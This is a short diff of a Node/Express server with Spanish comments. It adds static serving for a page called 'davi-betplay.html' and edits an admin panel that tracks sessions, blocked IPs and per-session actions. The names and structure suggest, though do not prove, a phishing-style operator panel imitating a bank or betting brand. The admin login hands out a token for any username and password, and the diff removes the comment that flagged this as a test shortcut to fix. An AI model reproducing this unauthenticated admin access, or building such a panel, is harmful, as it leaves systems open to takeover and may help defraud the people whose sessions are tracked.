@@ -5,6 +5,9 @@ const app = express();
 app.use(cors());
 app.use(express.json());
 
+// Servir archivos estáticos (para que abra davi-betplay.html)
+app.use(express.static(__dirname));
+
 let sesiones = [];
 let historial = [];
 let stats = { activos: 0, sesiones: 0, pendientes: 0, bloqueadas: 0, historial: 0 };
@@ -51,7 +54,6 @@ app.get('/admin/historial', (req, res) => {
 
 app.post('/admin/login', (req, res) => {
     const { usuario, password } = req.body;
-    // Pruebas: cualquier usuario/pass. Cámbialo luego.
     if (usuario && password) {
         res.json({ token: 'davi-token-' + Date.now(), usuario });
     } else {
@@ -76,7 +78,7 @@ app.post('/admin/sesion/:sessionId/accion', (req, res) => {
     res.json({ ok: true, estado: sesion.estado });
 });
 
-// Stubs para que no falle el panel si los consulta
+// Stubs para que no falle el panel
 app.get('/admin/activos', (req, res) => res.json({ activos: [] }));
 app.get('/admin/ips-bloqueadas', (req, res) => res.json({ ips: [] }));
 app.get('/admin/logs', (req, res) => res.json({ logs: [] }));
